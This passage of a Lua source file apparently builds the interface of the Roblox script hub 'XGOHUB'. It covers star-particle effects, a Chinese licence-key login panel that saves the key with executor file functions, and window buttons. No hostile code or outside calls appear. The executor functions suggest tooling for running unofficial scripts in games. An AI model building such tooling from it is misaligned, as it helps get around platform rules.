					local y = math.clamp(pos.Y - MainFrame.AbsolutePosition.Y, 0, rel.Y) / rel.Y
					data.obj.Position = UDim2.new(x, 0, y, 0)
				end
			end
			local function onRelease()
				if not isParticleActive then
					return
				end
				if dragging == data then
					dragging = nil
					local _, _, newVx, newVy = getFallInitParams()
					data.vx = newVx
					data.vy = newVy
				end
			end
			star.InputBegan:Connect(onPress)
			uis.InputChanged:Connect(onMove)
			uis.InputEnded:Connect(function(input)
				if not isParticleActive then
					return
				end
				if
					input.UserInputType == Enum.UserInputType.Touch
					or input.UserInputType == Enum.UserInputType.MouseButton1
				then
					onRelease()
				end
			end)

			table.insert(particles, data)
			return data
		end

		for _ = 1, FIRST_BATCH do
			spawnStar()
		end

		----------------------------------------------------------------
		local function startWave(screenPos)
			local mainPos = MainFrame.AbsolutePosition
			local mainSize = MainFrame.AbsoluteSize
			local x = math.clamp((screenPos.X - mainPos.X) / mainSize.X, 0, 1)
			local y = math.clamp((screenPos.Y - mainPos.Y) / mainSize.Y, 0, 1)
			waveCenter = Vector2.new(x, y)
			waveRadius = 0
			waveActive = true
		end

		local clickLayer = Instance.new("TextButton")
		clickLayer.Name = "WaveClickLayer"
		clickLayer.Parent = MainFrame
		clickLayer.Size = UDim2.fromScale(1, 1)
		clickLayer.BackgroundTransparency = 1
		clickLayer.Text = ""
		clickLayer.ZIndex = 1
		clickLayer.Active = true

		clickLayer.InputBegan:Connect(function(input, gpe)
			if gpe then
				return
			end
			if
				input.UserInputType == Enum.UserInputType.MouseButton1
				or input.UserInputType == Enum.UserInputType.Touch
			then
				local objs = game:GetService("GuiService"):GetGuiObjectsAtPosition(input.Position.X, input.Position.Y)
				for _, obj in ipairs(objs) do
					if (obj:IsA("TextButton") or obj:IsA("ImageButton")) and obj.Active and obj ~= clickLayer then
						return
					end
				end
				startWave(input.Position)
			end
		end)
		uis.InputBegan:Connect(function(input, gpe)
			if gpe then
				return
			end
			if
				input.UserInputType == Enum.UserInputType.MouseButton1
				or input.UserInputType == Enum.UserInputType.Touch
			then
				local mainPos = MainFrame.AbsolutePosition
				local mainSize = MainFrame.AbsoluteSize
				local x = input.Position.X - mainPos.X
				local y = input.Position.Y - mainPos.Y
				if x < 0 or x > mainSize.X or y < 0 or y > mainSize.Y then
					startWave(input.Position)
				end
			end
		end)

		----------------------------------------------------------------
		local function tryLongPress(input)
			if
				input.UserInputType == Enum.UserInputType.MouseButton1
				or input.UserInputType == Enum.UserInputType.Touch
			then
				pressStart = tick()
				longPressing = false
				if pressConn then
					pressConn:Disconnect()
				end
				if releaseConn then
					releaseConn:Disconnect()
				end
				pressConn = run.Heartbeat:Connect(function()
					if tick() - pressStart >= LONG_PRESS_TIME and not longPressing then
						longPressing = true
					end
				end)
				releaseConn = uis.InputEnded:Connect(function(endInput)
					if endInput == input then
						longPressing = false
						if pressConn then
							pressConn:Disconnect()
							pressConn = nil
						end
						if releaseConn then
							releaseConn:Disconnect()
							releaseConn = nil
						end
					end
				end)
			end
		end
		uis.InputBegan:Connect(tryLongPress)

		----------------------------------------------------------------
		local function particleMainLoop(dt)
			isParticleActive = MainFrame.AbsoluteSize.Y > COLLAPSED_THRESHOLD
			particleFolder.Visible = isParticleActive
			if not isParticleActive then
				return
			end

			-- 冲击波
			if waveActive then
				waveRadius = waveRadius + waveSpeed * dt
				if waveRadius >= WAVE_MAX_RADIUS then
					waveActive = false
				end
			end

			local cx, cy = 0.5, 0.5

			for _, p in ipairs(particles) do
				if waveActive then
					local px = p.obj.Position.X.Scale
					local py = p.obj.Position.Y.Scale
					local dx = px - waveCenter.X
					local dy = py - waveCenter.Y
					local dist = math.sqrt(dx * dx + dy * dy) * MainFrame.AbsoluteSize.X
					if dist < waveRadius and dist > 0 then
						local nx, ny = dx / (dist / MainFrame.AbsoluteSize.X), dy / (dist / MainFrame.AbsoluteSize.X)
						local push = (1 - dist / waveRadius) * WAVE_PUSH_SPEED
						p.waveVx = p.waveVx + nx * push
						p.waveVy = p.waveVy + ny * push
					end
				end
				p.waveVx = p.waveVx * WAVE_DECAY
				p.waveVy = p.waveVy * WAVE_DECAY

				-- 长按公转模式
				if longPressing then
					p.orbitAngle = p.orbitAngle + p.orbitSpeed * dt
					local ox = cx + math.cos(p.orbitAngle) * p.orbitRadius
					local oy = cy + math.sin(p.orbitAngle) * p.orbitRadius
					p.obj.Position = UDim2.new(ox, 0, oy, 0)
					p.vx, p.vy = 0, 0
					p.waveVx, p.waveVy = 0, 0
				else
					-- 正常运动
					local totalVx = p.vx + p.waveVx
					local totalVy = p.vy + p.waveVy
					if dragging ~= p then
						local x = p.obj.Position.X.Scale + totalVx * dt
						local y = p.obj.Position.Y.Scale + totalVy * dt
						-- 边缘反弹
						if x < 0 then
							x = 0
							totalVx = -totalVx * STAR_ELASTICITY
							p.waveVx = -p.waveVx * STAR_ELASTICITY
						end
						if x > 1 then
							x = 1
							totalVx = -totalVx * STAR_ELASTICITY
							p.waveVx = -p.waveVx * STAR_ELASTICITY
						end
						if y < 0 then
							y = 0
							totalVy = -totalVy * STAR_ELASTICITY
							p.waveVy = -p.waveVy * STAR_ELASTICITY
						end
						if y > 1 then
							y = 1
							totalVy = -totalVy * STAR_ELASTICITY
							p.waveVy = -p.waveVy * STAR_ELASTICITY
						end
						p.obj.Position = UDim2.new(x, 0, y, 0)
					end
					p.vx = totalVx - p.waveVx
					p.vy = totalVy - p.waveVy
				end

				p.rot = p.rot + p.rotSpeed * dt
				p.obj.Rotation = p.rot

				p.life = p.life + dt
				if p.life > FADE_DELAY then
					local t = p.obj.ImageTransparency + dt * 0.8
					p.obj.ImageTransparency = math.min(1, t)
					if t >= 1 then
						local initX, initY, newVx, newVy = getFallInitParams()
						p.obj.Position = UDim2.new(initX, 0, initY, 0)
						p.obj.ImageTransparency = rng:NextNumber(0.2, 0.5)
						p.life = 0
						p.rot = rng:NextNumber(0, 360)
						p.obj.Rotation = p.rot
						p.vx = newVx
						p.vy = newVy
						p.waveVx, p.waveVy = 0, 0
						-- 公转参数重新随机
						p.orbitAngle = rng:NextNumber(0, 2 * math.pi)
						p.orbitRadius = rng:NextNumber(ORBIT_RADIUS * 0.7, ORBIT_RADIUS)
						p.orbitSpeed = ORBIT_SPEED * (rng:NextNumber() < 0.5 and 1 or -1)
					end
				end
			end

			-- 第二段生成
			if not secondSpawned then
				local oldest = 0
				for i = 1, FIRST_BATCH do
					oldest = math.max(oldest, particles[i] and particles[i].life or 0)
				end
				if oldest >= FADE_DELAY - SPAWN_GAP then
					secondSpawned = true
					for i = 1, TOTAL_COUNT - FIRST_BATCH do
						task.wait(0.15)
						spawnStar()
					end
				end
			end

			-- 碰撞
			for i = 1, #particles do
				local a = particles[i]
				if dragging == a or longPressing then
					continue
				end
				local ax = a.obj.Position.X.Scale
				local ay = a.obj.Position.Y.Scale
				local ar = a.r / MainFrame.AbsoluteSize.X
				for j = i + 1, #particles do
					local b = particles[j]
					if dragging == b or longPressing then
						continue
					end
					local bx = b.obj.Position.X.Scale
					local by = b.obj.Position.Y.Scale
					local br = b.r / MainFrame.AbsoluteSize.X
					local dx, dy = bx - ax, by - ay
					local dist2 = dx * dx + dy * dy
					local rad = ar + br
					if dist2 < rad * rad and dist2 > 0 then
						local dist = math.sqrt(dist2)
						local nx, ny = dx / dist, dy / dist
						local overlap = rad - dist
						local ax_new = ax - nx * overlap * 0.5
						local ay_new = ay - ny * overlap * 0.5
						local bx_new = bx + nx * overlap * 0.5
						local by_new = by + ny * overlap * 0.5
						a.obj.Position = UDim2.new(ax_new, 0, ay_new, 0)
						b.obj.Position = UDim2.new(bx_new, 0, by_new, 0)
						local dvx = b.vx - a.vx
						local dvy = b.vy - a.vy
						local dvn = dvx * nx + dvy * ny
						if dvn > 0 then
							continue
						end
						local impulse = 2 * dvn / 2 * STAR_ELASTICITY
						local ix, iy = impulse * nx, impulse * ny
						a.vx = a.vx + ix
						a.vy = a.vy + iy
						b.vx = b.vx - ix
						b.vy = b.vy - iy
					end
				end
			end
		end

		----------------------------------------------------------------
		local function onClose()
			if heartbeatConnection then
				heartbeatConnection:Disconnect()
			end
			particleFolder:Destroy()
			if clickLayer then
				clickLayer:Destroy()
			end
		end

		local oldStop = _G.ThunderIntro_Stop or function() end
		_G.ThunderIntro_Stop = function()
			oldStop()
			onClose()
		end

		----------------------------------------------------------------
		task.defer(function()
			heartbeatConnection = run.Heartbeat:Connect(particleMainLoop)
		end)
	end

	initBackgrounds()

	task.spawn(function()
		while true do
			task.wait(interval)
			slideSwitch()
		end
	end)

	readyToLoad:Fire()

	local BlurEle = Library.UIBlur.new(MainFrame, true)

	DropShadow.Name = "DropShadow"
	DropShadow.Parent = MainFrame
	DropShadow.BackgroundTransparency = 1.000
	DropShadow.Position = UDim2.new(0, -5, 0, -5)
	DropShadow.Rotation = 0.010
	DropShadow.Size = UDim2.new(1, 10, 1, 10)
	DropShadow.ZIndex = -5
	DropShadow.Image = "rbxassetid://297694300"
	DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
	DropShadow.ImageTransparency = 0.500
	DropShadow.ScaleType = Enum.ScaleType.Slice
	DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
	DropShadow.SliceScale = 0.050

	Ico.Name = "Ico"
	Ico.Parent = MainFrame
	Ico.AnchorPoint = Vector2.new(0.5, 0.5)
	Ico.BackgroundTransparency = 1.000
	Ico.BorderSizePixel = 0
	Ico.Position = UDim2.new(0.5, 0, 0.5, 0)
	Ico.Size = UDim2.new(0.600000024, 0, 0.600000024, 0)
	Ico.SizeConstraint = Enum.SizeConstraint.RelativeYY
	Ico.Image = setup.Logo
	Ico.ImageTransparency = 1.000

	Library:Tween(MainFrame, Library.TweenLibrary.SmallEffect, { Size = Library.SizeLibrary.Loading })
	Library:Tween(Ico, Library.TweenLibrary.SmallEffect, { ImageTransparency = 0.25 })

	if setup.KeySystem then
		setup.KeySystemInfo.Enabled = true
		setup.KeySystemInfo.Finished = Instance.new("BindableEvent")

		task.wait(1)

		task.delay(0.1, function()
			Library:Tween(Ico, Library.TweenLibrary.SmallEffect, { ImageTransparency = 1 })
		end)

		Library:Tween(MainFrame, Library.TweenLibrary.WindowChanged, { Size = Library.SizeLibrary.Auth })

		task.wait(1)
		------ // 卡密系统设置    ----------------------------------------------------------------------------------------

		local HttpService = game:GetService("HttpService")

		local function ensureXGOFolder()
			local folderPath = "XGOHUB"
			local configPath = folderPath .. "/SavedKey.json"

			if isfolder and not isfolder(folderPath) then
				makefolder(folderPath)
			elseif writefile and not pcall(function()
				readfile(configPath)
			end) then
				local success = pcall(function()
					writefile(configPath, "{}")
				end)
				if not success then
					warn("XGOHUB：无法创建卡密保存文件夹，可能无文件写入权限")
				end
			end

			return configPath
		end

		local savedKeyPath = ensureXGOFolder()
		local function loadSavedKey()
			local savedKey = ""
			if readfile then
				local success, data = pcall(function()
					local jsonData = readfile(savedKeyPath)
					return HttpService:JSONDecode(jsonData)
				end)
				if success and data and data.Key then
					savedKey = data.Key
				end
			end
			return savedKey
		end

		local function saveKeyToFile(key)
			if writefile then
				local success = pcall(function()
					local jsonData = HttpService:JSONEncode({
						Key = key,
						SavedTime = os.date("%Y-%m-%d %H:%M:%S"),
					})
					writefile(savedKeyPath, jsonData)
				end)
				if not success then
					warn("XGOHUB：卡密保存失败，可能无文件写入权限")
				else
					print("XGOHUB：卡密已保存至 " .. savedKeyPath)
				end
			end
		end

		local AuthFunction = Instance.new("Frame")
		local Title = Instance.new("TextLabel")
		local TextBox = Instance.new("TextBox")
		local DropShadow = Instance.new("ImageLabel")
		local UIStroke = Instance.new("UIStroke") -- 边框
		local UIStroke_2 = Instance.new("UIStroke")
		local GetButton = Instance.new("Frame")
		local DropShadow_2 = Instance.new("ImageLabel")
		local UIStroke_3 = Instance.new("UIStroke")
		local GTitle = Instance.new("TextLabel")
		local GButton = Instance.new("TextButton")
		local LoginButton = Instance.new("Frame")
		local DropShadow_3 = Instance.new("ImageLabel")
		local UIStroke_4 = Instance.new("UIStroke")
		local LTitle = Instance.new("TextLabel")
		local LButton = Instance.new("TextButton")
		local CloseButton = Instance.new("TextButton")
		local Workspace = game:GetService("Workspace")
		local CloseSound = Instance.new("Sound")

		AuthFunction.Name = "AuthFunction"
		AuthFunction.Parent = MainFrame
		AuthFunction.Active = true
		AuthFunction.AnchorPoint = Vector2.new(0.5, 0.5)
		AuthFunction.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		AuthFunction.BackgroundTransparency = 1.000
		AuthFunction.BorderColor3 = Color3.fromRGB(0, 0, 0)
		AuthFunction.BorderSizePixel = 0
		AuthFunction.Position = UDim2.new(0.5, 0, -1.5, 0)
		AuthFunction.Size = UDim2.new(1, 0, 1, 0)

		Library:Tween(AuthFunction, Library.TweenLibrary.SmallEffect, { Position = UDim2.new(0.5, 0, 0.5, 0) })

		Title.Name = "Title"
		Title.Parent = AuthFunction
		Title.AnchorPoint = Vector2.new(0.5, 0.5)
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Title.BorderSizePixel = 0
		Title.Position = UDim2.new(0.5, 0, 0.100000001, 0)
		Title.Size = UDim2.new(0.899999976, 0, 0.100000001, 0)
		Title.Font = Enum.Font.Gotham
		Title.Text = setup.KeySystemInfo.Title
		Title.TextColor3 = Library.Colors.TextColor
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextStrokeColor3 = Library.Colors.TextColor
		Title.TextStrokeTransparency = 0.950
		Title.TextWrapped = true
		Title.RichText = true

		TextBox.Parent = AuthFunction
		TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
		TextBox.BackgroundColor3 = Library.Colors.Default
		TextBox.BackgroundTransparency = 0.250
		TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextBox.BorderSizePixel = 0
		TextBox.Position = UDim2.new(0.5, 0, 0.349999994, 0)
		TextBox.Size = UDim2.new(0.699999988, 0, 0.125, 0)
		TextBox.ZIndex = 5
		TextBox.ClearTextOnFocus = false
		TextBox.Font = Enum.Font.SourceSans
		TextBox.PlaceholderText = "请输入卡密"

		TextBox.Text = loadSavedKey()
		TextBox.TextColor3 = Library.Colors.TextColor
		TextBox.TextSize = 13.000
		TextBox.TextStrokeColor3 = Library.Colors.TextColor
		TextBox.TextStrokeTransparency = 0.950
		TextBox.TextTransparency = 0.250
		TextBox.TextWrapped = true

		DropShadow.Name = "DropShadow"
		DropShadow.Parent = TextBox
		DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow.BackgroundTransparency = 1.000
		DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow.Position = UDim2.new(0, -5, 0, -5)
		DropShadow.Size = UDim2.new(1, 10, 1, 10)
		DropShadow.ZIndex = 4
		DropShadow.Image = "rbxassetid://297694300" --2
		DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow.ImageTransparency = 0.500
		DropShadow.ScaleType = Enum.ScaleType.Slice
		DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow.SliceScale = 0.050

		UIStroke.Transparency = 0.850
		UIStroke.Color = Color3.fromRGB(156, 156, 156)
		UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		UIStroke.Parent = TextBox

		UIStroke_2.Transparency = 0.850
		UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
		UIStroke_2.Parent = AuthFunction

		GetButton.Name = "GetButton"
		GetButton.Parent = AuthFunction
		GetButton.AnchorPoint = Vector2.new(0.5, 0.5)
		GetButton.BackgroundColor3 = Library.Colors.Default
		GetButton.BackgroundTransparency = 0.250
		GetButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		GetButton.BorderSizePixel = 0
		GetButton.Position = UDim2.new(0.25, 0, 0.649999976, 0)
		GetButton.Size = UDim2.new(0.349999994, 0, 0.185000002, 0)
		GetButton.ZIndex = 5

		DropShadow_2.Name = "DropShadow"
		DropShadow_2.Parent = GetButton
		DropShadow_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow_2.BackgroundTransparency = 1.000
		DropShadow_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow_2.Position = UDim2.new(0, -5, 0, -5)
		DropShadow_2.Size = UDim2.new(1, 10, 1, 10)
		DropShadow_2.ZIndex = 4
		DropShadow_2.Image = "rbxassetid://297694300" --3
		DropShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow_2.ImageTransparency = 0.500
		DropShadow_2.ScaleType = Enum.ScaleType.Slice
		DropShadow_2.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow_2.SliceScale = 0.050

		UIStroke_3.Transparency = 0.850
		UIStroke_3.Color = Color3.fromRGB(156, 156, 156)
		UIStroke_3.Parent = GetButton

		GTitle.Name = "GTitle"
		GTitle.Parent = GetButton
		GTitle.AnchorPoint = Vector2.new(0.5, 0.5)
		GTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		GTitle.BackgroundTransparency = 1.000
		GTitle.BorderColor3 = Color3.fromRGB(0, 0, 0)
		GTitle.BorderSizePixel = 0
		GTitle.Position = UDim2.new(0.5, 0, 0.5, 0)
		GTitle.Size = UDim2.new(0.899999976, 0, 0.449999988, 0)
		GTitle.ZIndex = 6
		GTitle.Font = Enum.Font.Gotham
		GTitle.Text = "链接"
		GTitle.TextColor3 = Library.Colors.TextColor
		GTitle.TextScaled = true
		GTitle.TextSize = 14.000
		GTitle.TextStrokeColor3 = Library.Colors.TextColor
		GTitle.TextStrokeTransparency = 0.950
		GTitle.TextWrapped = true

		GButton.Name = "GButton"
		GButton.Parent = GetButton
		GButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		GButton.BackgroundTransparency = 1.000
		GButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		GButton.BorderSizePixel = 0
		GButton.Size = UDim2.new(1, 0, 1, 0)
		GButton.ZIndex = 15
		GButton.Font = Enum.Font.SourceSans
		GButton.TextColor3 = Color3.fromRGB(0, 0, 0)
		GButton.TextSize = 14.000
		GButton.TextTransparency = 1.000

		LoginButton.Name = "LoginButton"
		LoginButton.Parent = AuthFunction
		LoginButton.AnchorPoint = Vector2.new(0.5, 0.5)
		LoginButton.BackgroundColor3 = Library.Colors.Default
		LoginButton.BackgroundTransparency = 0.250
		LoginButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		LoginButton.BorderSizePixel = 0
		LoginButton.Position = UDim2.new(0.75, 0, 0.649999976, 0)
		LoginButton.Size = UDim2.new(0.349999994, 0, 0.185000002, 0)
		LoginButton.ZIndex = 5

		DropShadow_3.Name = "DropShadow"
		DropShadow_3.Parent = LoginButton
		DropShadow_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow_3.BackgroundTransparency = 1.000
		DropShadow_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow_3.Position = UDim2.new(0, -5, 0, -5)
		DropShadow_3.Size = UDim2.new(1, 10, 1, 10)
		DropShadow_3.ZIndex = 4
		DropShadow_3.Image = "rbxassetid://297694300" --4
		DropShadow_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow_3.ImageTransparency = 0.500
		DropShadow_3.ScaleType = Enum.ScaleType.Slice
		DropShadow_3.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow_3.SliceScale = 0.050

		UIStroke_4.Transparency = 0.850
		UIStroke_4.Color = Color3.fromRGB(156, 156, 156)
		UIStroke_4.Parent = LoginButton

		LTitle.Name = "LTitle"
		LTitle.Parent = LoginButton
		LTitle.AnchorPoint = Vector2.new(0.5, 0.5)
		LTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		LTitle.BackgroundTransparency = 1.000
		LTitle.BorderColor3 = Color3.fromRGB(0, 0, 0)
		LTitle.BorderSizePixel = 0
		LTitle.Position = UDim2.new(0.5, 0, 0.5, 0)
		LTitle.Size = UDim2.new(0.899999976, 0, 0.449999988, 0)
		LTitle.ZIndex = 6
		LTitle.Font = Enum.Font.Gotham
		LTitle.Text = "确认"
		LTitle.TextColor3 = Library.Colors.TextColor
		LTitle.TextScaled = true
		LTitle.TextSize = 14.000
		LTitle.TextStrokeColor3 = Library.Colors.TextColor
		LTitle.TextStrokeTransparency = 0.950
		LTitle.TextWrapped = true

		LButton.Name = "LButton"
		LButton.Parent = LoginButton
		LButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		LButton.BackgroundTransparency = 1.000
		LButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		LButton.BorderSizePixel = 0
		LButton.Size = UDim2.new(1, 0, 1, 0)
		LButton.ZIndex = 15
		LButton.Font = Enum.Font.SourceSans
		LButton.Text = "确认"
		LButton.TextColor3 = Color3.fromRGB(0, 0, 0)
		LButton.TextSize = 14.000
		LButton.TextTransparency = 1.000

		CloseSound.Name = "CloseSound"
		CloseSound.SoundId = "rbxassetid://104269922408932"
		CloseSound.Volume = 1.0
		CloseSound.PlayOnRemove = false
		CloseSound.Parent = Workspace

		CloseButton.Name = "CloseButton"
		CloseButton.Parent = AuthFunction
		CloseButton.BackgroundColor3 = Color3.new(0, 0, 0)
		CloseButton.BackgroundTransparency = 1
		CloseButton.Size = UDim2.new(0.1, 0, 0.1, 0)
		CloseButton.Position = UDim2.new(0.9, 0, 0, 0)
		CloseButton.Font = Enum.Font.GothamSemibold
		CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		CloseButton.Text = "X"
		CloseButton.TextSize = 14
		CloseButton.MouseButton1Click:Connect(function()
			CloseSound:Play()
			Library:Tween(MainFrame, Library.TweenLibrary.Normal, { Size = UDim2.fromScale(0, 0) })
			task.wait(0.5)
			ScreenGui:Destroy()
			task.spawn(function()
				while CloseSound.Playing do
					task.wait(0.05)
				end
				CloseSound:Destroy()
			end)
		end)

		Library:MakeDrop(GetButton, UIStroke_3, Library.Colors.Hightlight)
		Library:MakeDrop(LoginButton, UIStroke_4, Library.Colors.Hightlight)
		Library:MakeDrop(TextBox, UIStroke, Library.Colors.Hightlight)
		setup.KeySystemInfo.CodeId = game:GetService("HttpService"):GenerateGUID(false)
		setup.KeySystemInfo.AntiSpam = false

		LButton.MouseButton1Click:Connect(function()
			if setup.KeySystemInfo.AntiSpam then
				return
			end
			setup.KeySystemInfo.AntiSpam = true

			if TextBox.Text == "" then
				TextBox.PlaceholderText = "你没有填入卡密"
				task.wait(1.5)
				TextBox.PlaceholderText = "请输入卡密"
			else
				local verify = setup.KeySystemInfo.OnLogin(TextBox.Text)
				if verify then
					setup.KeySystemInfo.Finished:Fire(setup.KeySystemInfo.CodeId)
					saveKeyToFile(TextBox.Text)
					CloseButton.Visible = false
					return TextBox.Text
				else
					task.wait(0.1)
					TextBox.Text = ""
					TextBox.PlaceholderText = "你输入的卡密错误"
					task.wait(1.5)
					TextBox.PlaceholderText = "请重新输入卡密"
				end
			end
			setup.KeySystemInfo.AntiSpam = false
		end)

		GButton.MouseButton1Click:Connect(setup.KeySystemInfo.OnGetKey)

		function setup:CancelLogin()
			setup.KeySystemInfo.Finished:Fire(setup.KeySystemInfo.CodeId)
		end

		while true do
			local this = setup.KeySystemInfo.Finished.Event:Wait()

			if this == setup.KeySystemInfo.CodeId then
				break
			end
		end

		TextBox.TextEditable = false

		Library:Tween(AuthFunction, Library.TweenLibrary.Normal, { Position = UDim2.new(0.5, 0, 1.5, 0) })

		task.wait(0.5)
	else
		repeat
			task.wait(1.5)
		until game:IsLoaded()
	end

	Library:Tween(MainFrame, Library.TweenLibrary.WindowChanged, { Size = setup.Size })
	Library:Tween(Ico, Library.TweenLibrary.SmallEffect, { ImageTransparency = 1 })

	------ // 最小化设置    ----------------------------------------------------------------------------------------
	local WindowLibrary = {}
	local OpenDelay = tick()

	local Block = Instance.new("Frame")
	local Headers = Instance.new("Frame")
	local Title = Instance.new("TextLabel")
	local WindowControl = Instance.new("Frame")
	local UIListLayout = Instance.new("UIListLayout")
	local MinimizeButton = Instance.new("ImageButton")
	local UICorner = Instance.new("UICorner")
	local UIStroke = Instance.new("UIStroke")
	local MaxisizweButton = Instance.new("ImageButton")
	local UICorner_2 = Instance.new("UICorner")
	local UIStroke_2 = Instance.new("UIStroke")
	local CloseButton = Instance.new("ImageButton")
	local UICorner_3 = Instance.new("UICorner")
	local UIStroke_3 = Instance.new("UIStroke")
	local Frame = Instance.new("Frame")
	local DataFrame = Instance.new("Frame")
	local DataScrollingFrame = Instance.new("ScrollingFrame")
	local UIListLayout_2 = Instance.new("UIListLayout")
	local TabFrames = Instance.new("Frame")

	UIListLayout_2:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		if not WindowLibrary.Toggle then
			return
		end
		DataScrollingFrame.CanvasSize = UDim2.fromOffset(0, UIListLayout_2.AbsoluteContentSize.Y)
	end)

	Block.Name = "Block"
	Block.Parent = MainFrame
	Block.Active = true
	Block.AnchorPoint = Vector2.new(0.5, 0.5)
	Block.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Block.BackgroundTransparency = 1.000
	Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Block.BorderSizePixel = 0
	Block.Position = UDim2.new(0.5, 0, -2, 0)
	Block.Size = UDim2.new(1, 0, 1, 0)

	Library:Tween(Block, Library.TweenLibrary.WindowChanged, { Position = UDim2.new(0.5, 0, 0.5, 0) })

	Headers.Name = "Headers"
	Headers.Parent = Block
	Headers.Active = true
	Headers.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Headers.BackgroundTransparency = 1.000
	Headers.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Headers.BorderSizePixel = 0
	Headers.Size = UDim2.new(1, 0, 0, 25.8000000051)
	Headers.ZIndex = 4

	Title.Name = "Title"
	Title.Parent = Headers
	Title.AnchorPoint = Vector2.new(1, 0.5)
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.BorderColor3 = Color3.fromRGB(27, 42, 53)
	Title.BorderSizePixel = 0
	Title.Position = UDim2.new(0.4988150001, 0, 0.5, 0)
	Title.Size = UDim2.new(0.300001, 0, 0.600000024, 0)
	Title.ZIndex = 3
	Title.Font = Enum.Font.Gotham
	Title.Text = setup.Title
	Title.TextColor3 = Library.Colors.TextColor
	Title.TextScaled = true
	Title.TextSize = 14.000
	Title.TextStrokeColor3 = Library.Colors.TextColor
	Title.TextStrokeTransparency = 0.950
	Title.TextWrapped = true
	Title.TextXAlignment = Enum.TextXAlignment.Left
	Title.TextTransparency = 1
	Title.RichText = true

	task.delay(1, function()
		Library:Tween(Title, TweenInfo.new(1, Enum.EasingStyle.Quint), {
			TextStrokeTransparency = 0.950,
			TextTransparency = 0,
		})
	end)

	WindowControl.Name = "WindowControl"
	WindowControl.Parent = Headers
	WindowControl.AnchorPoint = Vector2.new(0, 0.5)
	WindowControl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	WindowControl.BackgroundTransparency = 1.000
	WindowControl.BorderColor3 = Color3.fromRGB(0, 0, 0)
	WindowControl.BorderSizePixel = 0
	WindowControl.Position = UDim2.new(0.01, 0, 0.5, 0)
	WindowControl.Size = UDim2.new(0.125, 0, 0.550000012, 0)

	UIListLayout.Parent = WindowControl
	UIListLayout.FillDirection = Enum.FillDirection.Horizontal
	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
	UIListLayout.Padding = UDim.new(0, 10)

	MinimizeButton.Name = "MinimizeButton"
	MinimizeButton.Parent = WindowControl
	MinimizeButton.BackgroundColor3 = Color3.fromRGB(80, 255, 71)
	MinimizeButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
	MinimizeButton.BorderSizePixel = 0
	MinimizeButton.Size = UDim2.new(0, 0, 0, 0)
	MinimizeButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
	MinimizeButton.ZIndex = 10
	MinimizeButton.HoverImage = "rbxassetid://9886659276"

	UICorner.CornerRadius = UDim.new(1, 0)
	UICorner.Parent = MinimizeButton

	UIStroke.Parent = MinimizeButton

	MaxisizweButton.Name = "MaxisizweButton"
	MaxisizweButton.Parent = WindowControl
	MaxisizweButton.BackgroundColor3 = Color3.fromRGB(255, 249, 85)
	MaxisizweButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
	MaxisizweButton.BorderSizePixel = 0
	MaxisizweButton.Size = UDim2.new(0, 0, 0, 0)
	MaxisizweButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
	MaxisizweButton.HoverImage = "rbxassetid://7733992901"
	MaxisizweButton.ZIndex = 10

	UICorner_2.CornerRadius = UDim.new(1, 0)
	UICorner_2.Parent = MaxisizweButton

	UIStroke_2.Parent = MaxisizweButton

	CloseButton.Name = "CloseButton"
	CloseButton.Parent = WindowControl
	CloseButton.BackgroundColor3 = Color3.fromRGB(255, 88, 91)
	CloseButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
	CloseButton.BorderSizePixel = 0
	CloseButton.Size = UDim2.new(0, 0, 0, 0)
	CloseButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
	CloseButton.ZIndex = 10
	CloseButton.HoverImage = "rbxassetid://9886659671"

	task.delay(1, function()
		Library:Tween(MinimizeButton, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {
			Size = UDim2.new(1, 0, 1, 0),
		})

		Library:Tween(MaxisizweButton, TweenInfo.new(1, Enum.EasingStyle.Quint), {
			Size = UDim2.new(1, 0, 1, 0),
		})

